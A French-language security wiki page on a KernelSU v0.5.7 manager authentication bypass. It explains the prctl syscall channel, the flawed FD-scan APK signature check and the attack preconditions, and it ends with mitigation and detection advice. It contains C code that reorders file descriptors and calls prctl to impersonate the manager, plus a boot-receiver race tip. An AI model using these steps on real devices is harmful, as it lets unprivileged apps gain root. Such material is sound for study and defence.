# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Les rooting frameworks tels que KernelSU, APatch et SKRoot patchent ou hookent le kernel Android/Linux et exposent des fonctionnalités privilégiées à une manager app userspace non privilégiée. Magisk est abordé séparément ci-dessous, car CVE-2024-48336 concernait le chargement de code côté manager plutôt que cette voie syscall de KernelSU.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Cette page résume les techniques et pièges mis en évidence par des recherches publiques (notamment l’analyse de KernelSU v0.5.7 par Zimperium) afin d’aider les red et blue teams à comprendre les attack surfaces, les primitives d’exploitation et les mitigations robustes.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Dans KernelSU v0.5.7, un kernel hook sur `prctl` reçoit une valeur magique, un ID de commande et des arguments spécifiques à la commande depuis le userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- L’appelant demande d’abord le statut du manager avec `CMD_BECOME_MANAGER`. L’autorisation est spécifique à chaque commande : `CMD_GRANT_ROOT` vérifie l’état du manager/allowlist, `CMD_ALLOW_SU` est réservé au manager et `CMD_SET_SEPOLICY` est réservé au root dans cette version.<sup>[[2]](#references)[[11]](#references)</sup>
- D’autres commandes interrogent la version/configuration ou signalent des événements du framework.<sup>[[2]](#references)</sup>
- Comme n’importe quelle app peut invoquer cette interface syscall, la fiabilité de l’authentification du manager est critique.<sup>[[1]](#references)[[2]](#references)</sup>

Exemple (design de KernelSU) :
- Hooked syscall : prctl
- Valeur magique pour rediriger vers le handler KernelSU : 0xDEADBEEF
- Commandes incluses : CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

Lorsque le userspace appelle prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU vérifie :<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- Le chemin fourni doit commencer par un préfixe attendu pour l’UID de l’appelant, par exemple /data/data/<pkg> ou /data/user/<id>/<pkg>.
- Référence : logique de préfixe de chemin dans core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Ownership check
- Le chemin doit appartenir à l’UID de l’appelant.
- Référence : logique de propriété dans core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- Parcourir les file descriptors ouverts du processus appelant dans l’ordre croissant des descripteurs.
- Pour chaque fichier régulier dont le chemin commence par `/data/app/` et se termine par `/base.apk`, exiger que le chemin contienne la sous-chaîne du package dérivée du chemin du data directory fourni.
- Vérifier la signature du premier candidat satisfaisant ces vérifications de chemin.
- Analyser la signature APK v2 et la vérifier par rapport au certificat officiel du manager.
- Références : manager.c (parcours des FDs), apk_sign.c (vérification APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Si toutes les vérifications réussissent, le kernel met temporairement en cache l’UID du manager ; les commandes réservées au manager acceptent alors cet UID, tandis que les autres commandes conservent leur propre UID ou leurs vérifications d’allowlist.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 ne lie pas le résultat de la signature à l’identité du package installé par le PackageManager. Dans `manager.c`, le test du package est uniquement une vérification de sous-chaîne du chemin (`strstr(cwd, pkg)`) ; le premier candidat qui réussit cette vérification est ensuite soumis à la vérification de signature. Un attaquant peut donc placer un véritable manager APK sous un chemin `/data/app/` qui contient également le nom du package de l’attaquant et faire en sorte qu’il soit sélectionné en premier.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Cette confiance indirecte permet à une app non privilégiée d’usurper l’identité du manager sans posséder sa signing key.<sup>[[1]](#references)</sup>

Propriétés clés exploitées :<sup>[[1]](#references)[[3]](#references)</sup>
- Le FD scan est ordonné par index de descripteur et la vérification du package est un test de sous-chaîne du chemin, et non une liaison vérifiée entre le package et l’identité de l’APK.
- open() renvoie le FD disponible portant le plus petit numéro. En fermant d’abord les FDs portant les numéros les plus bas, un attaquant peut contrôler l’ordre.
- Un manager APK bundled peut être placé sous `/data/app/` à un chemin contenant la chaîne du package de l’attaquant tout en conservant la signature officielle du manager.

---
## Attack preconditions

Le cas concret de KernelSU v0.5.7 nécessite :<sup>[[1]](#references)[[3]](#references)</sup>

- L’appareil est déjà rooté avec un rooting framework vulnérable (par exemple KernelSU v0.5.7).
- L’attaquant peut exécuter localement du code arbitraire non privilégié (processus d’app Android).
- Pour l’implémentation v0.5.7, `current->real_parent` doit avoir l’UID 0 (le commentaire du code source décrit cela comme une exigence de processus enfant direct du zygote) ; `manager.c` rejette les autres parents.<sup>[[3]](#references)</sup>
- Le véritable manager ne s’est pas encore authentifié (par exemple juste après un reboot). Certains frameworks mettent en cache l’UID du manager après une réussite ; vous devez gagner la race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

Étapes générales (la vidéo de démonstration montre le proof of concept public en fonctionnement) :<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Construire un chemin valide vers le data directory de votre propre app afin de satisfaire les vérifications de préfixe et de propriété.
2) Placer un véritable KernelSU Manager base.apk sous `/data/app/` à un chemin contenant votre chaîne de package, puis l’ouvrir sur un FD portant un numéro inférieur à celui de votre propre base.apk.
3) Invoquer prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) pour réussir les vérifications.
4) Utiliser `CMD_GRANT_ROOT`, puis `CMD_ALLOW_SU` pour un su persistant ; invoquer `CMD_SET_SEPOLICY`, réservé au root, uniquement après avoir obtenu le root et seulement lorsqu’il est supporté.

Notes pratiques sur l’étape 2 (FD ordering) :<sup>[[1]](#references)</sup>
- Identifier le FD de votre processus correspondant à votre propre /data/app/*/base.apk en parcourant les symlinks de /proc/self/fd.
- Fermer un FD de numéro bas (par exemple stdin, fd 0) et ouvrir d’abord le legitimate manager APK afin qu’il occupe le fd 0 (ou tout autre index inférieur à celui du FD de votre propre base.apk).
- Bundler le legitimate manager APK avec votre app afin que son chemin commence par `/data/app/`, se termine par `/base.apk` et contienne votre chaîne de package. Par exemple, un chemin situé sous le répertoire `lib` de votre app peut satisfaire ces vérifications.<sup>[[1]](#references)[[3]](#references)</sup>

Exemples de code (Android/Linux, à titre illustratif uniquement) :

Énumérer les FDs ouverts pour localiser les entrées base.apk :
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forcer un FD de numéro inférieur à pointer vers l’APK légitime du manager :
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Authentification du Manager via le hook `prctl` de KernelSU v0.5.7 :<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Après succès, commandes privilégiées (exemples) :<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promouvoir le processus actuel en root
- CMD_ALLOW_SU: ajouter votre package/UID à l’allowlist pour un su persistant
- CMD_SET_SEPOLICY: ajuster la policy SELinux après l’obtention de root ; KernelSU v0.5.7 vérifie la présence de l’UID 0 pour cette commande.<sup>[[2]](#references)</sup>

Conseil de race/persistence :
- Enregistrer un receiver `BOOT_COMPLETED` dans l’AndroidManifest (`RECEIVE_BOOT_COMPLETED`) pour démarrer après un reboot et tenter l’authentification avant le manager légitime ; la permission autorise la réception de `ACTION_BOOT_COMPLETED`, mais ne garantit pas à elle seule la priorité de scheduling.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Conseils de détection et de mitigation

Pour les développeurs de frameworks :
- Lier l’authentification au package/UID de l’appelant, et non à des FDs arbitraires :
- Résoudre le package de l’appelant à partir de son UID et le vérifier par rapport à la signature du package installé (via PackageManager), plutôt que de scanner les FDs.
- Si la vérification est kernel-only, utiliser une identité stable de l’appelant (task creds) et valider depuis une source de vérité stable gérée par init/helper userspace, et non depuis les FDs du processus.
- Éviter les vérifications de préfixe de chemin comme identité ; elles peuvent être trivialement satisfaites par l’appelant.
- Utiliser un challenge–response basé sur un nonce via le canal et supprimer toute identité de manager mise en cache au boot ou lors d’événements clés.
- Envisager un IPC authentifié basé sur binder au lieu de détourner des syscalls génériques lorsque cela est possible.

Pour les defenders/blue team :
- Détecter la présence de rooting frameworks et de processus de manager ; surveiller les appels prctl avec des magic constants suspectes (par exemple, 0xDEADBEEF) si vous disposez de télémétrie kernel.<sup>[[1]](#references)[[11]](#references)</sup>
- Sur les flottes administrées, bloquer ou signaler les boot receivers provenant de packages non approuvés qui tentent rapidement d’exécuter des commandes privilégiées du manager après le boot.
- Vérifier que les appareils utilisent des versions corrigées du framework ; invalider les IDs de manager mis en cache lors d’une mise à jour.

Limitations de l’attaque :<sup>[[1]](#references)[[2]](#references)</sup>
- Affecte uniquement les appareils déjà rootés avec un framework vulnérable.
- Nécessite généralement un reboot/une fenêtre de race avant que le manager légitime ne s’authentifie (certains frameworks mettent en cache l’UID du manager jusqu’à sa réinitialisation).

---
## Notes connexes entre les frameworks

- L’authentification basée sur un mot de passe (par exemple, les builds historiques d’APatch/SKRoot) peut être faible si les mots de passe sont devinables ou soumis au bruteforce, ou si les validations sont défectueuses.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- L’authentification basée sur le package/la signature (par exemple, KernelSU) est plus robuste en principe, mais doit être liée à l’appelant réel, et non à des artefacts dérivés du chemin et sélectionnés via des scans de FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk : CVE-2024-48336 affectait les builds antérieurs à Canary 27007 qui chargeaient du code depuis un package GMS non vérifié, permettant à une application locale d’exécuter du code dans l’application Magisk et d’obtenir une escalation to root sans interaction de l’utilisateur.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Le rooting de tous les maux : failles de sécurité susceptibles de compromettre votre appareil mobile](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – vérifications d’authentification de core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – itération des FD, vérification du package et appel de signature dans manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – vérification APK v2 dans apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Projet KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Problème Magisk #8279 – vérifier que GMS est une application système](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Vidéo de démonstration du PoC KSU (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identifiants de commande de ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
